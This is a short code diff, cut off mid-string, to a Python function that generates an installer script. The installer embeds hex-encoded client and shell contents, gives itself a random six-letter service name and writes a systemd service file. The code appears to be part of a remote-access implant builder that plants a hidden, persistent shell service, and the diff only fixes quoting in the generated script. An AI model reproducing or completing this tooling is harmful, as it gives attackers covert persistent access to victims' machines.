@@ -20,10 +20,10 @@ def createInstaller(host):
 #!/usr/bin/env python3
 import os
 import random
-CLIENTCONTS = """ + clientConts.encode().hex() + """
-SECCLIENTCONTS = """ + shellConts.encode().hex() + """
+CLIENTCONTS = """ + '"' + clientConts.encode().hex() + '"' + """
+SECCLIENTCONTS = """ + '"' + shellConts.encode().hex() + '"' + """
 
-SERVICE_NAME = """ + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)) + """
+SERVICE_NAME = """ + '"' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)) + '"' + """
 
 f = open('/etc/systemd/system/' + SERVICE_NAME + '.service', 'w')
 serviceConts = \"""
